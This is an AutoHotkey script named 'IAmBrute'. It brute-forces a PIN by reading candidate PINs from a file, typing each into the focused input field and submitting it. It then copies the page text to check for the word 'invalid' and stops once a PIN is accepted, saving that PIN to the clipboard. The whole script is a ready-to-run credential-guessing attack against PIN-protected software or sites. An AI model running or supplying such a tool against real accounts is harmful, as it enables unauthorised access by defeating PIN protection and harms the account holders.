#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

^b::
  s_tiny := 2
  s_small := 100
  s_medium := 3000
  s_long := 5000

  Sleep 1000

  #Persistent
  ToolTip, IAmBrute`nEt tu`, Brute?
  SetTimer, RemoveToolTip, %s_medium%

  Sleep, %s_medium%
  start_time := A_TickCount

  Loop, read, %A_WorkingDir%\brute.txt
  {
    Loop, parse, A_LoopReadLine, %A_Tab%
    {
      Send, %A_LoopField%
      Sleep, %s_tiny%
      Send, {Tab}
      Sleep, %s_tiny%
      Send, {Enter}
      Sleep, %s_small%
      Send, ^a
      Sleep, %s_tiny%
      Send, ^c
      Sleep, %s_tiny%
      Send, ^+{Home}
      Sleep, %s_tiny%

      haystack = %clipboard%
      needle = invalid
      StringGetPos, pos, haystack, %needle%

      if (pos >= 0)
      {
        #Persistent
        ToolTip, IAmBrute`nThe invalid pin error string was found at position %pos% when trying pin %A_LoopField%. Trying next pin...
        SetTimer, RemoveToolTip, %s_long%
      }
      else
      {
        clipboard = %A_LoopField%
        elapsed_time := A_TickCount - start_time
        MsgBox, The correct pin was identified as %A_LoopField%. Saved to clipboard. IAmBrute took %elapsed_time%ms to find the correct pin.
        ExitApp
      }

      Sleep, %s_tiny%

      Send, +{Tab}
    }
  }
Return

RemoveToolTip:
  SetTimer, RemoveToolTip, Off
  ToolTip
return

Escape::
  ExitApp
Return
